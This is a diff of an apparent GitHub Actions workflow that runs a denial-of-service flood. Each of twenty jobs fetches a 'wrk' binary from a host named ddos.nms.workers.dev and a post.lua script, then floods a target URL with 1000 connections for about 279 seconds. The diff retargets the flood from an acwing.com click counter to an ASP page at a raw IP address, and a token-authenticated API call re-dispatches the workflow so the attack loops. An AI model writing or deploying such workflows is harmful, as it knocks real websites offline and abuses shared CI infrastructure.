@@ -16,7 +16,7 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d280s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d280s http://218.22.132.6:9080/cjcx/cxjg.asp
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
   build2:
     runs-on: ubuntu-latest
@@ -27,7 +27,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build3:
     runs-on: ubuntu-latest
     steps:
@@ -37,7 +37,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build4:
     runs-on: ubuntu-latest
     steps:
@@ -47,7 +47,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build5:
     runs-on: ubuntu-latest
     steps:
@@ -57,7 +57,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build6:
     runs-on: ubuntu-latest
     steps:
@@ -67,7 +67,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build7:
     runs-on: ubuntu-latest
     steps:
@@ -77,7 +77,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build8:
     runs-on: ubuntu-latest
     steps:
@@ -87,7 +87,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build9:
     runs-on: ubuntu-latest
     steps:
@@ -97,7 +97,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build10:
     runs-on: ubuntu-latest
     steps:
@@ -107,7 +107,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build11:
     runs-on: ubuntu-latest
     steps:
@@ -117,7 +117,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build12:
     runs-on: ubuntu-latest
     steps:
@@ -127,7 +127,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build13:
     runs-on: ubuntu-latest
     steps:
@@ -137,7 +137,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build14:
     runs-on: ubuntu-latest
     steps:
@@ -147,7 +147,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build15:
     runs-on: ubuntu-latest
     steps:
@@ -157,7 +157,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build16:
     runs-on: ubuntu-latest
     steps:
@@ -167,7 +167,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build17:
     runs-on: ubuntu-latest
     steps:
@@ -177,7 +177,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build18:
     runs-on: ubuntu-latest
     steps:
@@ -187,7 +187,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build19:
     runs-on: ubuntu-latest
     steps:
@@ -197,7 +197,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
   build20:
     runs-on: ubuntu-latest
     steps:
@@ -207,4 +207,4 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s https://www.acwing.com/status/count/click/
+          ./wrk -c1000 -t300 -d279s http://218.22.132.6:9080/cjcx/cxjg.asp
